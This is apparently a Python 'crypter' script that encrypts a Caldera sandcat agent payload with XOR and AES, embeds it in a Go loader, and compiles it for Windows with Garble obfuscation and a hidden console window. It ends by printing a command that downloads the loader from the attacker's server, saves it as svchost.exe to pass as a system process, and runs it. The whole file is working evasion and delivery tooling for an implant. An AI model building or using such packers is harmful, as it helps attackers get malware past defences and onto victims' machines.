#!/usr/bin/env python3
"""
Merlino Crypter - AES + XOR encryption for payload obfuscation
"""

import os
import sys
import base64
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad

def xor_encrypt(data, key):
    """XOR encryption (second layer)"""
    return bytes([b ^ key for b in data])

def aes_encrypt(data, key):
    """AES-CFB encryption (first layer)"""
    cipher = AES.new(key, AES.MODE_CFB)
    iv = cipher.iv
    ciphertext = cipher.encrypt(data)
    return iv + ciphertext

def create_crypted_loader(payload_path, output_path, server_url):
    """Create encrypted loader with embedded payload"""
    
    print(f"[*] Reading payload: {payload_path}")
    with open(payload_path, 'rb') as f:
        payload = f.read()
    
    print(f"[*] Payload size: {len(payload)} bytes")
    
    # Generate random AES key
    aes_key = get_random_bytes(32)  # 256-bit key
    print(f"[*] Generated AES-256 key")
    
    # Layer 1: XOR encryption
    print("[*] Applying XOR layer...")
    xor_payload = xor_encrypt(payload, 0x42)
    
    # Layer 2: AES encryption
    print("[*] Applying AES-CFB layer...")
    encrypted = aes_encrypt(xor_payload, aes_key)
    
    # Base64 encode
    b64_payload = base64.b64encode(encrypted).decode()
    b64_key = base64.b64encode(aes_key).decode()
    
    print(f"[*] Encrypted size: {len(encrypted)} bytes")
    print(f"[*] Base64 size: {len(b64_payload)} chars")
    
    # Read crypter template
    crypter_template_path = 'merlino-crypter.go'
    print(f"[*] Reading crypter template: {crypter_template_path}")
    
    with open(crypter_template_path, 'r') as f:
        crypter_code = f.read()
    
    # Replace placeholders
    crypter_code = crypter_code.replace('PAYLOAD_PLACEHOLDER', b64_payload)
    crypter_code = crypter_code.replace('KEY_PLACEHOLDER', b64_key)
    crypter_code = crypter_code.replace('SERVERURL', server_url)
    
    # Save modified crypter
    crypter_src = output_path + '.go'
    print(f"[*] Writing crypter source: {crypter_src}")
    with open(crypter_src, 'w') as f:
        f.write(crypter_code)
    
    # Compile crypter with Garble
    print("[*] Compiling crypter with Garble...")
    compile_cmd = (
        f'GOOS=windows GOARCH=amd64 CGO_ENABLED=0 '
        f'garble -tiny -literals -seed=random build '
        f'-trimpath -ldflags="-s -w -H windowsgui" '
        f'-o {output_path} {crypter_src}'
    )
    
    result = os.system(compile_cmd)
    
    if result == 0:
        print(f"[+] Crypted loader created: {output_path}")
        final_size = os.path.getsize(output_path)
        print(f"[+] Final size: {final_size} bytes ({final_size/1024/1024:.2f} MB)")
        
        # Cleanup source
        os.remove(crypter_src)
        print("[*] Cleaned up temporary files")
        return True
    else:
        print("[-] Compilation failed!")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: ./merlino-encrypt.py <server_url>")
        print("Example: ./merlino-encrypt.py https://192.168.124.133")
        sys.exit(1)
    
    server_url = sys.argv[1]
    payload_path = "plugins/sandcat/payloads/sandcat.go-windows"
    output_path = "plugins/sandcat/payloads/merlino-crypted.exe"
    
    print("="*60)
    print("    MERLINO CRYPTER - AES+XOR Payload Encryption")
    print("="*60)
    print()
    
    if create_crypted_loader(payload_path, output_path, server_url):
        print()
        print("[+] SUCCESS! Use this on Windows:")
        print(f"    curl.exe -k {server_url}/file/download?name=merlino-crypted.exe -o svchost.exe")
        print("    .\\svchost.exe")
    else:
        sys.exit(1)
